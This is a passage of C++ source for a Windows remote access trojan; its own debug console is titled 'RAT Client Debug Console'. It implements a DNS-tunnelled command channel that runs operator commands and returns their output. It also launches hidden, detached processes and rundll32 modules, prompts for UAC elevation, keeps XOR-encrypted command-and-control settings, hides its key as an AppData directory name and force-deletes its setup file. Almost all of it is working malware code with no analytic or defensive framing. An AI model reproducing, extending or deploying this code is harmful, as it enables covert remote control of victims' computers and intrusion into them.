                session.response_chunks.pop_front();
                bool more = !session.response_chunks.empty();
                resp.Set("status", "command");
                resp.Set("data", chunk);
                resp.Set("more", more ? "1" : "0");
                DebugLog("REVERSE DNS: Returning chunk, " +
                    std::to_string(session.response_chunks.size()) + " remaining");
            }

            else if (!session.pending_cmd.empty() && !session.awaiting_response) {
                resp.Set("status", "command");
                resp.Set("data", session.pending_cmd);
                session.awaiting_response = true;
                session.cmd_sent_time = GetTickCount();
                DebugLog("REVERSE DNS: Sending command: " + session.pending_cmd);
            }
            else {
                resp.Set("status", "ack");
                resp.Set("data", "no_cmd");
            }
        }
        else if (msg_type == "result") {
            std::string incoming_data = message.Get("data");
            DebugLog("REVERSE DNS: Received result packet, data: " + incoming_data.substr(0, 80));

            std::string actualCmd = incoming_data;
            if (actualCmd.find("cmd-") == 0) {
                actualCmd = actualCmd.substr(4);
            }

            bool is_ack = (incoming_data == "received" ||
                incoming_data == "beacon_ok" ||
                incoming_data == "no_cmd" ||
                incoming_data.empty());

            if (!is_ack) {

                if (actualCmd == "-reverse_dns_0") {
                    DebugLog("REVERSE DNS: Received -reverse_dns_0 — signalling revert to normal DNS polling");
                    session.revert_requested = true;
                    resp.Set("status", "ack");
                    resp.Set("data", "reverting");
                }
                else {
                    DebugLog("REVERSE DNS: Executing command: " + actualCmd);

                    ReleaseMutex(sessionMutex);

                    std::string execResult = ExecuteCommand(actualCmd);

                    if (execResult.empty()) {
                        execResult = "Command executed (no output)";
                    }

                    DebugLog("REVERSE DNS: Execution complete, result length: " +
                        std::to_string(execResult.length()));

                    WaitForSingleObject(sessionMutex, INFINITE);

                    session.response_chunks.clear();
                    const size_t CHUNK_SIZE = 800;
                    for (size_t i = 0; i < execResult.size(); i += CHUNK_SIZE) {
                        session.response_chunks.push_back(execResult.substr(i, CHUNK_SIZE));
                    }
                    session.last_response = "";
                    session.awaiting_response = false;
                    session.pending_cmd = "";
                    session.cmd_sent_time = 0;

                    resp.Set("status", "ack");
                    resp.Set("data", "executing");
                }
            }
            else {

                session.last_response = incoming_data;
                session.awaiting_response = false;
                session.pending_cmd = "";
                session.cmd_sent_time = 0;
                resp.Set("status", "ack");
                resp.Set("data", "received");
                DebugLog("REVERSE DNS: ACK received from controller");
            }
        }
        else {
            resp.Set("status", "ack");
            resp.Set("data", "unknown_type");
        }

        ReleaseMutex(sessionMutex);
        SendEncryptedResponse(resp, request, request_len, from);
    }

public:
    std::string last_result;

    ReverseDNSServer(const std::string& key, int p, const std::string& dom)
        : encryption_key(key), port(p), domain(dom),
        running(false), sock(INVALID_SOCKET) {
        session.awaiting_response = false;
        session.cmd_sent_time = 0;
        session.addr_known = false;
        sessionMutex = CreateMutex(NULL, FALSE, NULL);
    }

    ~ReverseDNSServer() {
        Stop();
        CloseHandle(sessionMutex);
    }

    bool Start() {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);

        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) {
            DebugLog("REVERSE DNS: socket() failed: " + std::to_string(WSAGetLastError()));
            return false;
        }

        int reuse = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR,
            (const char*)&reuse, sizeof(reuse));

        sockaddr_in bind_addr{};
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons((u_short)port);
        bind_addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(sock, (sockaddr*)&bind_addr, sizeof(bind_addr)) == SOCKET_ERROR) {
            DebugLog("REVERSE DNS: bind() failed on port " + std::to_string(port) +
                " — Error: " + std::to_string(WSAGetLastError()));
            closesocket(sock);
            sock = INVALID_SOCKET;
            return false;
        }

        DWORD timeout_ms = 100;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,
            (const char*)&timeout_ms, sizeof(timeout_ms));

        running = true;
        DebugLog("REVERSE DNS: Server listening on UDP port " + std::to_string(port));
        return true;
    }

    void Stop() {
        running = false;
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
            sock = INVALID_SOCKET;
        }
        WSACleanup();
        DebugLog("REVERSE DNS: Server stopped");
    }

    bool IsRunning() const { return running; }

    bool IsRevertRequested() {
        WaitForSingleObject(sessionMutex, INFINITE);
        bool r = session.revert_requested;
        ReleaseMutex(sessionMutex);
        return r;
    }

    void ListenLoop() {
        uint8_t buf[512];
        DebugLog("REVERSE DNS: Listen loop started");

        while (running) {
            sockaddr_in from{};
            int from_len = sizeof(from);

            int received = recvfrom(sock, (char*)buf, sizeof(buf), 0,
                (sockaddr*)&from, &from_len);

            if (received == SOCKET_ERROR) {
                if (WSAGetLastError() == WSAETIMEDOUT) continue;
                if (running)
                    DebugLog("REVERSE DNS: recvfrom error: " +
                        std::to_string(WSAGetLastError()));
                continue;
            }

            std::string fragment, agent_id;
            if (!ParseQuery(buf, received, fragment, agent_id)) {
                continue;
            }

            try {
                std::string padded = fragment;
                for (char& c : padded) c = toupper(c);
                while (padded.size() % 8 != 0) padded += '=';

                std::string b64 = FromBase32(padded);
                std::string xor_data = Base64Decode(b64);
                std::string decrypted = XORCipher(xor_data, encryption_key);

                decrypted.erase(std::remove(decrypted.begin(),
                    decrypted.end(), '\0'), decrypted.end());

                SimpleJSON message;
                message.Parse(decrypted);

                if (!message.Get("type").empty()) {
                    ProcessMessage(agent_id, message, buf, received, from);
                }

            }
            catch (...) {

            }
        }
    }

    void QueueCommand(const std::string& cmd) {
        WaitForSingleObject(sessionMutex, INFINITE);
        session.pending_cmd = cmd;
        session.awaiting_response = false;
        DebugLog("REVERSE DNS: Queued command: " + cmd);
        ReleaseMutex(sessionMutex);
    }

    std::string GetResult() {
        WaitForSingleObject(sessionMutex, INFINITE);

        if (session.addr_known) {
            ReleaseMutex(sessionMutex);
            return "";
        }
        std::string r = session.last_response;
        session.last_response = "";
        ReleaseMutex(sessionMutex);
        return r;
    }

    bool ControllerConnected() {
        WaitForSingleObject(sessionMutex, INFINITE);
        bool connected = session.addr_known;
        ReleaseMutex(sessionMutex);
        return connected;
    }
};

void InitDebugConsole() {
    AllocConsole();
    FILE* pFile;
    freopen_s(&pFile, "CONOUT$", "w", stdout);
    freopen_s(&pFile, "CONOUT$", "w", stderr);
    freopen_s(&pFile, "CONIN$", "r", stdin);
    SetConsoleTitleA("RAT Client Debug Console");
    std::cout << "[DEBUG] Console initialized" << std::endl;
}

void DebugLog(const std::string& message) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char timeStr[32];
    sprintf_s(timeStr, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
    std::cout << timeStr << message << std::endl;
}

std::string ENCRYPTION_KEY;
std::string g_currentDir;
std::string g_lastCmdExecuted;
std::string g_device_id;
std::mutex  g_target_id_mutex;
std::string g_target_id;
std::map<std::string, PROCESS_INFORMATION> g_active_modules;
std::mutex g_module_mutex;
bool g_ipSent = false;

struct PTYSession {
    HPCON hpc;
    HANDLE process;
    HANDLE input_pipe;
    HANDLE output_pipe;
    std::string shell_type;
    bool active;
};

PTYSession g_ptySession = { nullptr, nullptr, nullptr, nullptr, "", false };
std::mutex g_ptyMutex;

const char* INTERACTIVE_CMDS[] = {
    "diskpart", "powershell", "cmd", "ftp", "telnet", nullptr
};

std::string GetTempPath() {
    char path[MAX_PATH];
    ::GetTempPathA(MAX_PATH, path);
    return std::string(path);
}

std::string GetAppDataPath() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
    return std::string(path);
}

std::string GetBaseDir() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    std::string path(buffer);
    size_t pos = path.find_last_of("\\/");
    return path.substr(0, pos);
}

bool FileExists(const std::string& path) {
    DWORD attrib = GetFileAttributesA(path.c_str());
    return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

bool DirectoryExists(const std::string& path) {
    DWORD attrib = GetFileAttributesA(path.c_str());
    return (attrib != INVALID_FILE_ATTRIBUTES && (attrib & FILE_ATTRIBUTE_DIRECTORY));
}

bool CreateDirectoryRecursive(const std::string& path) {
    return CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

bool DeleteFileSecure(const std::string& path) {
    if (DeleteFileA(path.c_str())) {
        DebugLog("Deleted: " + path);
        return true;
    }
    return false;
}

bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

bool RunAsAdmin() {
    if (IsAdmin()) {
        DebugLog("Already running as admin");
        return true;
    }
    DebugLog("Requesting elevation...");
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    SHELLEXECUTEINFOA sei = { 0 };
    sei.cbSize = sizeof(SHELLEXECUTEINFOA);
    sei.lpVerb = "runas";
    sei.lpFile = szPath;
    sei.nShow = SW_SHOW;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    if (ShellExecuteExA(&sei)) {
        ExitProcess(0);
    }
    return false;
}

bool IsProcessRunning(const std::string& processName) {
    bool exists = false;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe)) {
            do {
                std::wstring wpe(pe.szExeFile);
                std::string exeFile(wpe.begin(), wpe.end());

                if (_stricmp(exeFile.c_str(), processName.c_str()) == 0) {
                    exists = true;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return exists;
}

bool RunExecutable(const std::string& exePath) {

    std::string filename = exePath.substr(exePath.find_last_of("/\\") + 1);

    if (IsProcessRunning(filename)) {
        DebugLog("Process " + filename + " is already active. Skipping launch.");
        return true;
    }

    DebugLog("Launching fresh instance: " + exePath);
    if (!FileExists(exePath)) {
        DebugLog("ERROR: Executable not found: " + exePath);
        return false;
    }

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };
    char cmdLine[MAX_PATH];

    strcpy_s(cmdLine, exePath.c_str());

    if (CreateProcessA(
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS,
        NULL,
        NULL,
        &si,
        &pi)) {

        DebugLog("Process started. Proceeding to RAT initialization...");

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }

    DebugLog("ERROR: Failed to start process: " + std::to_string(GetLastError()));
    return false;
}

bool LoadModule(const std::string& moduleName) {

    std::string modulePath = GetBaseDir() + "\\modules\\main\\" + moduleName;

    if (!FileExists(modulePath)) {
        DebugLog("Core Module not found: " + modulePath);
        return false;
    }

    HMODULE hModule = LoadLibraryA(modulePath.c_str());
    if (!hModule) {
        DebugLog("Failed to load core module: " + moduleName + " (Error: " + std::to_string(GetLastError()) + ")");
        return false;
    }

    typedef void (*ModuleMainFunc)();
    ModuleMainFunc moduleMain = (ModuleMainFunc)GetProcAddress(hModule, "ModuleMain");

    if (moduleMain) {
        DebugLog("Executing core module: " + moduleName);
        moduleMain();
        return true;
    }

    DebugLog("Core module loaded but 'ModuleMain' export not found: " + moduleName);
    return true;
}

bool IsProcessElevated() {
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    return isElevated;
}

bool LaunchModuleDetached(const std::string& modulePath, const std::string& moduleName) {
    DebugLog("=== LAUNCHING MODULE: " + moduleName + " ===");

    {
        std::lock_guard<std::mutex> lock(g_module_mutex);
        if (g_active_modules.find(moduleName) != g_active_modules.end()) {
            PROCESS_INFORMATION& pi = g_active_modules[moduleName];
            DWORD exitCode = 0;
            if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode == STILL_ACTIVE) {
                DebugLog("Module already running: " + moduleName);
                return true;
            }
            else {

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                g_active_modules.erase(moduleName);
            }
        }
    }

    std::string callbackArgs = "";
    std::string cleanModulePath = modulePath;
    {
        const std::string marker = "|CALLBACK:";
        size_t cbPos = modulePath.find(marker);
        if (cbPos != std::string::npos) {
            cleanModulePath = modulePath.substr(0, cbPos);
            callbackArgs = modulePath.substr(cbPos + 1);
            DebugLog("Callback suffix stripped: " + callbackArgs);
            DebugLog("Clean module path: " + cleanModulePath);
        }
    }

    std::string absolutePath = cleanModulePath;

    if (cleanModulePath.length() < 3 || cleanModulePath[1] != ':') {
        absolutePath = GetBaseDir() + "\\" + cleanModulePath;
    }

    DebugLog("Module path (original): " + modulePath);
    DebugLog("Module path (absolute): " + absolutePath);

    if (!FileExists(absolutePath)) {
        DebugLog("ERROR: Module not found at: " + absolutePath);

        if (cleanModulePath.find("modules\\") == 0) {
            std::string altPath = GetBaseDir() + "\\" + cleanModulePath;
            if (FileExists(altPath)) {
                absolutePath = altPath;
                DebugLog("Found module at alternative path: " + altPath);
            }
            else {
                return false;
            }
        }
        else {
            return false;
        }
    }

    size_t lastSlash = absolutePath.find_last_of("\\/");
    std::string workingDir = (lastSlash != std::string::npos)
        ? absolutePath.substr(0, lastSlash)
        : GetBaseDir();

    DebugLog("Working directory: " + workingDir);

    bool isElevated = IsProcessElevated();
    DebugLog("Current process elevation status: " + std::string(isElevated ? "Elevated" : "Not Elevated"));

    std::string params = "\"" + absolutePath + "\",StartRoutine";
    if (!callbackArgs.empty()) {
        params += " " + callbackArgs;
    }

    if (isElevated) {

        DebugLog("Already elevated - launching directly with CreateProcess");

        std::string commandLine = "rundll32.exe " + params;
        DebugLog("Command line: " + commandLine);

        std::vector<char> cmdBuffer(commandLine.begin(), commandLine.end());
        cmdBuffer.push_back('\0');

        STARTUPINFOA si = { 0 };
        si.cb = sizeof(STARTUPINFOA);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = { 0 };

        BOOL success = CreateProcessA(
            NULL,
            cmdBuffer.data(),
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
            NULL,
            workingDir.c_str(),
            &si,
            &pi
        );

        if (!success) {
            DWORD error = GetLastError();
            DebugLog("ERROR: CreateProcess failed with error " + std::to_string(error));
            return false;
        }

        {
            std::lock_guard<std::mutex> lock(g_module_mutex);
            g_active_modules[moduleName] = pi;
        }

        DebugLog(" Module launched successfully (PID: " + std::to_string(pi.dwProcessId) + ")");
        return true;
    }
    else {

        DebugLog("Not elevated - requesting elevation via UAC");

        SHELLEXECUTEINFOA sei = { 0 };
        sei.cbSize = sizeof(sei);
        sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
        sei.lpVerb = "runas";
        sei.lpFile = "rundll32.exe";
        sei.lpParameters = params.c_str();
        sei.lpDirectory = workingDir.c_str();
        sei.nShow = SW_HIDE;

        DebugLog("Requesting elevation for: rundll32.exe");
        DebugLog("Parameters: " + params);
        DebugLog("Directory: " + workingDir);

        if (ShellExecuteExA(&sei)) {
            if (sei.hProcess) {
                PROCESS_INFORMATION pi = { 0 };
                pi.hProcess = sei.hProcess;
                pi.dwProcessId = GetProcessId(sei.hProcess);

                {
                    std::lock_guard<std::mutex> lock(g_module_mutex);
                    g_active_modules[moduleName] = pi;
                }

                DebugLog(" Module launched with elevation (PID: " + std::to_string(pi.dwProcessId) + ")");
                return true;
            }
            else {

                DebugLog(" Module launched with elevation (no process handle available)");
                return true;
            }
        }
        else {
            DWORD error = GetLastError();

            if (error == ERROR_CANCELLED) {
                DebugLog("User cancelled UAC elevation prompt");
                return false;
            }

            DebugLog("ERROR: ShellExecuteEx failed with error " + std::to_string(error));
            return false;
        }
    }
}

bool StopModule(const std::string& moduleName) {
    DebugLog("=== STOPPING MODULE: " + moduleName + " ===");

    std::lock_guard<std::mutex> lock(g_module_mutex);

    if (g_active_modules.find(moduleName) == g_active_modules.end()) {
        DebugLog("Module not in active list: " + moduleName);
        return false;
    }

    PROCESS_INFORMATION& pi = g_active_modules[moduleName];

    DWORD exitCode = 0;
    if (!GetExitCodeProcess(pi.hProcess, &exitCode) || exitCode != STILL_ACTIVE) {
        DebugLog("Module already stopped");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        g_active_modules.erase(moduleName);
        return true;
    }

    DebugLog("Sending termination signal...");
    if (TerminateProcess(pi.hProcess, 0)) {
        WaitForSingleObject(pi.hProcess, 2000);
        DebugLog(" Module terminated");
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    g_active_modules.erase(moduleName);

    return true;
}

std::string Base64Encode(const std::string& data) {
    if (data.empty()) return "";
    DWORD dwLen = 0;

    CryptBinaryToStringA((BYTE*)data.c_str(), static_cast<DWORD>(data.length()),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwLen);

    std::vector<char> buffer(dwLen);

    if (CryptBinaryToStringA((BYTE*)data.c_str(), static_cast<DWORD>(data.length()),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, buffer.data(), &dwLen)) {
        return std::string(buffer.data());
    }
    return "";
}

std::string Base64Decode(const std::string& input) {
    if (input.empty()) return "";
    DWORD dwLen = 0;

    CryptStringToBinaryA(input.c_str(), static_cast<DWORD>(input.length()),
        CRYPT_STRING_BASE64, NULL, &dwLen, NULL, NULL);

    std::vector<BYTE> buffer(dwLen);

    if (CryptStringToBinaryA(input.c_str(), static_cast<DWORD>(input.length()),
        CRYPT_STRING_BASE64, buffer.data(), &dwLen, NULL, NULL)) {
        return std::string((char*)buffer.data(), dwLen);
    }
    return "";
}

std::string XOREncrypt(const std::string& data, const std::string& key) {
    std::string output = data;
    if (key.empty()) return output;
    for (size_t i = 0; i < data.length(); ++i) {
        output[i] = data[i] ^ key[i % key.length()];
    }
    return output;
}

std::string XORDecrypt(const std::string& data, const std::string& key) {
    return XOREncrypt(data, key);
}

std::string GetCleanCPath() {
    return GetAppDataPath() + "\\clean.c";
}

std::string GetKeyDirectoryName() {
    std::string cleanCPath = GetCleanCPath();

    if (!DirectoryExists(cleanCPath)) {
        return "";
    }

    WIN32_FIND_DATAA findData;
    std::string searchPattern = cleanCPath + "\\*";
    HANDLE hFind = FindFirstFileA(searchPattern.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return "";
    }

    std::string keyDirName;
    do {
        if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            strcmp(findData.cFileName, ".") != 0 &&
            strcmp(findData.cFileName, "..") != 0) {
            keyDirName = findData.cFileName;
            break;
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
    return keyDirName;
}

std::string ReconstructKey(const std::string& dirName) {

    return dirName;
}

bool CreateKeyDirectory(const std::string& fernetKey) {
    std::string cleanCPath = GetCleanCPath();

    if (!DirectoryExists(cleanCPath)) {
        if (!CreateDirectoryRecursive(cleanCPath)) {
            DebugLog("Failed to create clean.c directory");
            return false;
        }
        DebugLog("Created clean.c directory");
    }

    std::string dirName = fernetKey;

    std::string keyDirPath = cleanCPath + "\\" + dirName;
    if (!DirectoryExists(keyDirPath)) {
        if (!CreateDirectoryRecursive(keyDirPath)) {
            DebugLog("Failed to create key directory");
            return false;
        }
        DebugLog("Created key directory: " + dirName);
    }

    return true;
}

std::string GetListenerConfigPath() {
    return GetTempPath() + "listener_config.enc";
}

std::string GetConfigKeyPath() {
    return GetBaseDir() + "\\config_key.json";
}

bool SaveEncryptedConfig(const SimpleJSON& config, const std::string& key) {
    std::string configPath = GetListenerConfigPath();
    DebugLog("Saving encrypted config to: " + configPath);

    std::string jsonData = config.ToString();
    std::string encrypted = XOREncrypt(jsonData, key);
    std::string encoded = Base64Encode(encrypted);

    std::ofstream file(configPath, std::ios::binary);
    if (!file.is_open()) {
        DebugLog("ERROR: Cannot create encrypted config");
        return false;
    }

    file << encoded;
    file.close();
    DebugLog("Encrypted config saved");
    return true;
}

bool LoadEncryptedConfig(SimpleJSON& config, const std::string& key) {
    std::string configPath = GetListenerConfigPath();
    DebugLog("Loading encrypted config from: " + configPath);

    if (!FileExists(configPath)) {
        DebugLog("Encrypted config not found");
        return false;
    }

    std::ifstream file(configPath, std::ios::binary);
    if (!file.is_open()) return false;

    std::stringstream buffer;
    buffer << file.rdbuf();
    std::string encoded = buffer.str();
    file.close();

    if (encoded.empty()) return false;

    try {
        std::string encrypted = Base64Decode(encoded);
        std::string decrypted = XORDecrypt(encrypted, key);
        config.Parse(decrypted);

        if (config.Get("BIN_ID").empty() || config.Get("API_KEY").empty() ||
            config.Get("URL").empty()) {
            DebugLog("Decrypted config missing required fields");
            return false;
        }

        DebugLog("Config decrypted successfully");
        return true;
    }
    catch (...) {
        DebugLog("ERROR: Decryption failed");
        return false;
    }
}

bool LoadConfigKeyJSON(SimpleJSON& config) {
    std::string configPath = GetConfigKeyPath();
    DebugLog("Loading config_key.json from: " + configPath);

    if (!FileExists(configPath)) {
        DebugLog("config_key.json not found");
        return false;
    }

    std::ifstream file(configPath);
    if (!file.is_open()) return false;

    std::stringstream buffer;
    buffer << file.rdbuf();
    file.close();

    config.Parse(buffer.str());

    std::string fernetKey = config.Get("FERNET_KEY");
    if (config.Get("BIN_ID").empty() || config.Get("API_KEY").empty() ||
        config.Get("URL").empty() || fernetKey.empty()) {
        DebugLog("config_key.json missing required fields");
        return false;
    }

    DebugLog("config_key.json loaded successfully");
    DebugLog("FERNET_KEY: " + fernetKey);
    return true;
}

bool LoadConfigKeyJSONAndDelete(SimpleJSON& config) {
    std::string configPath = GetConfigKeyPath();

    DebugLog("FIRST RUN: Loading config_key.json");
    DebugLog("Path: " + configPath);


    if (!FileExists(configPath)) {
        DebugLog("config_key.json not found");
        return false;
    }

    std::ifstream file(configPath);
    if (!file.is_open()) {
        DebugLog("ERROR: Cannot open config_key.json");
        return false;
    }

    std::stringstream buffer;
    buffer << file.rdbuf();
    file.close();

    config.Parse(buffer.str());

    std::string fernetKey = config.Get("FERNET_KEY");
    std::string bin_id = config.Get("BIN_ID");
    std::string api_key = config.Get("API_KEY");
    std::string url = config.Get("URL");

    if (bin_id.empty() || api_key.empty() || url.empty() || fernetKey.empty()) {
        DebugLog("ERROR: config_key.json missing required fields");
        return false;
    }

    DebugLog(" config_key.json loaded successfully");
    DebugLog("  BIN_ID: " + bin_id);
    DebugLog("  API_KEY: " + api_key.substr(0, 20) + "...");
    DebugLog("  URL: " + url);
    DebugLog("  FERNET_KEY: " + fernetKey);

    ENCRYPTION_KEY = fernetKey;

    if (!CreateKeyDirectory(fernetKey)) {
        DebugLog("ERROR: Failed to create key directory");
        return false;
    }

    SimpleJSON encConfig;
    encConfig.Set("BIN_ID", bin_id);
    encConfig.Set("API_KEY", api_key);
    encConfig.Set("URL", url);

    if (!SaveEncryptedConfig(encConfig, ENCRYPTION_KEY)) {
        DebugLog("ERROR: Failed to save listener_config.enc");
        return false;
    }

    DebugLog(" Saved as listener_config.enc");

    DebugLog("DELETING config_key.json for security...");


    if (DeleteFileSecure(configPath)) {
        DebugLog(" config_key.json DELETED successfully");
        DebugLog(" Agent now uses encrypted listener_config.enc");
    }
    else {
        DWORD error = GetLastError();
        DebugLog("WARNING: Failed to delete config_key.json (Error: " + std::to_string(error) + ")");
        DebugLog("Attempting force delete...");

        std::string deleteCmd = "cmd.exe /c del /f /q \"" + configPath + "\" > nul 2>&1";
        system(deleteCmd.c_str());
        Sleep(500);

        if (!FileExists(configPath)) {
            DebugLog(" config_key.json deleted via force command");
        }
        else {
            DebugLog(" WARNING: config_key.json still exists - manual deletion recommended");
        }
    }

    config.Set("BIN_ID", bin_id);
    config.Set("API_KEY", api_key);
    config.Set("URL", url);

    return true;
}

bool UpdateConnectionConfig(const std::string& jsonCommand) {

    DebugLog("Updating Connection Configuration...");

    SimpleJSON newParams;
    newParams.Parse(jsonCommand);

    std::string newBin = newParams.Get("new_bin");
    std::string newApi = newParams.Get("new_api");
    std::string newUrl = newParams.Get("new_url");

    if (newBin.empty() || newApi.empty() || newUrl.empty()) {
        DebugLog("ERROR: Update command missing required fields");
        return false;
    }

    std::string keyDir = GetKeyDirectoryName();
    if (keyDir.empty()) {
        DebugLog("ERROR: Encryption key directory not found");
        return false;
    }
    std::string currentKey = ReconstructKey(keyDir);

    SimpleJSON updatedConfig;
    updatedConfig.Set("BIN_ID", newBin);
    updatedConfig.Set("API_KEY", newApi);
    updatedConfig.Set("URL", newUrl);

    if (!SaveEncryptedConfig(updatedConfig, currentKey)) {
        DebugLog("ERROR: Failed to save new encrypted config");
        return false;
    }

    DebugLog("Configuration updated and saved successfully.");
    DebugLog("New BIN_ID: " + newBin);

    return true;
}

bool UpdateFernetKey(const std::string& newFernetKey) {

    DebugLog("Updating Fernet Key");
    DebugLog("New Key: " + newFernetKey);


    std::string cleanCPath = GetCleanCPath();

    if (!DirectoryExists(cleanCPath)) {
        DebugLog("ERROR: clean.c directory not found");
        return false;
    }

    std::string oldKeyDirName = GetKeyDirectoryName();
    if (oldKeyDirName.empty()) {
        DebugLog("ERROR: No key directory found in clean.c");
        return false;
    }

    DebugLog("Found old key directory: " + oldKeyDirName);

    std::string oldKey = ReconstructKey(oldKeyDirName);
    DebugLog("Reconstructed old key: " + oldKey);

    std::string encConfigPath = GetListenerConfigPath();
    std::string decConfigPath = GetTempPath() + "listener_config.json";

    DebugLog("Decrypting config with old key...");
    DebugLog("Source: " + encConfigPath);
    DebugLog("Target: " + decConfigPath);

    if (!FileExists(encConfigPath)) {
        DebugLog("ERROR: Encrypted config not found");
        return false;
    }

    std::ifstream encFile(encConfigPath, std::ios::binary);
    if (!encFile.is_open()) {
        DebugLog("ERROR: Cannot open encrypted config");
        return false;
    }

    std::stringstream buffer;
    buffer << encFile.rdbuf();
    std::string encoded = buffer.str();
    encFile.close();

    if (encoded.empty()) {
        DebugLog("ERROR: Encrypted config is empty");
        return false;
    }

    SimpleJSON config;
    try {
        std::string encrypted = Base64Decode(encoded);
        std::string decrypted = XORDecrypt(encrypted, oldKey);
        config.Parse(decrypted);

        if (config.Get("BIN_ID").empty() || config.Get("API_KEY").empty() ||
            config.Get("URL").empty()) {
            DebugLog("ERROR: Decrypted config missing required fields");
            return false;
        }

        DebugLog("Config decrypted successfully with old key");
    }
    catch (...) {
        DebugLog("ERROR: Failed to decrypt config with old key");
        return false;
    }

    std::ofstream jsonFile(decConfigPath);
    if (!jsonFile.is_open()) {
        DebugLog("ERROR: Cannot create decrypted JSON file");
        return false;
    }

    std::string jsonData = config.ToString();
    jsonFile << jsonData;
    jsonFile.close();

    DebugLog("Decrypted JSON saved to: " + decConfigPath);
    DebugLog("JSON Content: " + jsonData);

    if (!FileExists(decConfigPath)) {
        DebugLog("ERROR: Failed to create decrypted JSON file");
        return false;
    }

    DebugLog("Decrypted file confirmed");

    std::string oldKeyDirPath = cleanCPath + "\\" + oldKeyDirName;
    DebugLog("Deleting old key directory: " + oldKeyDirPath);

    if (!RemoveDirectoryA(oldKeyDirPath.c_str())) {
        DWORD error = GetLastError();
        DebugLog("WARNING: Failed to delete old key directory (Error: " + std::to_string(error) + ")");
        std::string forceDeleteCmd = "cmd.exe /c rmdir /s /q \"" + oldKeyDirPath + "\"";
        system(forceDeleteCmd.c_str());
        Sleep(500);
    }
    else {
        DebugLog("Old key directory deleted successfully");
    }

    std::string newKeyDirName = newFernetKey;

    if (!newKeyDirName.empty() && newKeyDirName.back() == '=') {
        newKeyDirName.pop_back();
    }

    std::string newKeyDirPath = cleanCPath + "\\" + newKeyDirName;
    DebugLog("Creating new key directory: " + newKeyDirName);

    if (!CreateDirectoryRecursive(newKeyDirPath)) {
        DebugLog("ERROR: Failed to create new key directory");
        return false;
    }

    DebugLog("New key directory created successfully");

    std::string newKey = ReconstructKey(newKeyDirName);
    DebugLog("Reconstructed new key: " + newKey);

    DebugLog("Re-encrypting config with new key...");

    std::string encryptedData = XOREncrypt(jsonData, newKey);
    std::string encodedData = Base64Encode(encryptedData);

    std::ofstream encFileNew(encConfigPath, std::ios::binary);
    if (!encFileNew.is_open()) {
        DebugLog("ERROR: Cannot write encrypted config");
        return false;
    }

    encFileNew << encodedData;
    encFileNew.close();

    DebugLog("Config re-encrypted with new key");

    ENCRYPTION_KEY = newKey;
    DebugLog("Global encryption key updated");

    if (FileExists(decConfigPath)) {
        DeleteFileSecure(decConfigPath);
        DebugLog("Decrypted JSON file deleted for security");
    }


    DebugLog("Fernet Key Update Complete");


    return true;
}

std::string GetModeFilePath() {
    return GetBaseDir() + "\\modules\\main\\mode.json";
}

std::string GetSettingsFilePath() {
    return GetBaseDir() + "\\modules\\main\\settings.json";
}

struct PollSettings {
    int poll_duration;
    int sleep_duration;
    int dns_timeout;
    int dns_max_retries;
};

PollSettings LoadPollSettings() {
